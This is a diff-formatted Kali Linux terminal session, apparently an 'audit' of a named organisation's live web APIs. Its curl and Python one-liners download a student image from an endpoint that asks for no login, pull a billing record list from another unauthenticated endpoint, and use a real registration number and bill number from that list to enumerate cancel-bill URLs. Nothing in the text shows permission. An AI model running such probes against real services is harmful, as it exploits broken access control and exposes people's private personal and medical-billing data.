@@ -1,0 +1,46 @@
+┌──(kalics㉿kalics)-[~/narayana-audit]
+└─$ cd ~/narayana-audit && echo "=== A. WHAT THE 401 ACTUALLY RETURNS ===" && curl -k -s -i -m 15 "https://narayanagroup.co.in/NtraktApi/api/Account/UserInfo" | head -n 14 ; echo -e "\n=== B. StudentAvailability — IS IT A PHOTO? ===" && curl -k -s -m 30 -D /tmp/hh.txt "https://narayanagroup.co.in/NtraktApi/api/StudentAvailability/1" -o /tmp/sa.bin && head -n 8 /tmp/hh.txt && file /tmp/sa.bin ; echo -e "\n=== C. Investigation/Cancel — CHASE A REAL BILL ===" && curl -k -s -m 30 "https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Approval/List" -o /tmp/ic.json && PRNO=$(python3 -c "
+import json; print(json.load(open('/tmp/ic.json'))['data'][0].get('Prno'))") && BILL=$(python3 -c "
+import json; print(json.load(open('/tmp/ic.json'))['data'][0].get('BillNo'))") && echo "using Prno=$PRNO  BillNo=$BILL" && for cb in 1 2 3 ; do echo -n "   Cancel/Bill/$PRNO/$BILL/$cb -> " ; curl -k -s -m 30 "https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Bill/$PRNO/$BILL/$cb" -o /tmp/cb.json ; python3 -c "
+import json
+try:
+    d=json.load(open('/tmp/cb.json'))['data']
+    print('records:',len(d))
+    if d and isinstance(d[0],dict):
+        pop=[(sum(1 for x in d if x.get(k) not in (None,'','0')),k) for k in d[0].keys()]
+        pop.sort(reverse=True)
+        print('   ','; '.join('%s %d/%d'%(k,n,len(d)) for n,k in pop[:6] if n))
+except: print('raw:',open('/tmp/cb.json').read()[:100])
+" ; done ; rm -f /tmp/sa.bin /tmp/hh.txt /tmp/ic.json /tmp/cb.json
+=== A. WHAT THE 401 ACTUALLY RETURNS ===
+HTTP/1.1 401 Unauthorized
+Date: Mon, 12 Oct 2026 06:50:07 GMT
+Server: Apache
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Type: application/json; charset=utf-8
+Expires: -1
+X-AspNet-Version: 4.0.30319
+WWW-Authenticate: Bearer
+X-Powered-By: ASP.NET
+Content-Length: 61
+
+{"Message":"Authorization has been denied for this request."}
+=== B. StudentAvailability — IS IT A PHOTO? ===
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:50:08 GMT
+Server: Apache
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Length: 7155
+Content-Type: image/png
+Expires: -1
+/tmp/sa.bin: PNG image data, 220 x 220, 8-bit/color RGB, non-interlaced
+
+=== C. Investigation/Cancel — CHASE A REAL BILL ===
+using Prno=1005411787  BillNo=202310160001
+   Cancel/Bill/1005411787/202310160001/1 -> records: 0
+   Cancel/Bill/1005411787/202310160001/2 -> records: 0
+   Cancel/Bill/1005411787/202310160001/3 -> records: 0
+                                                                                                                                                                                                                                            
+┌──(k
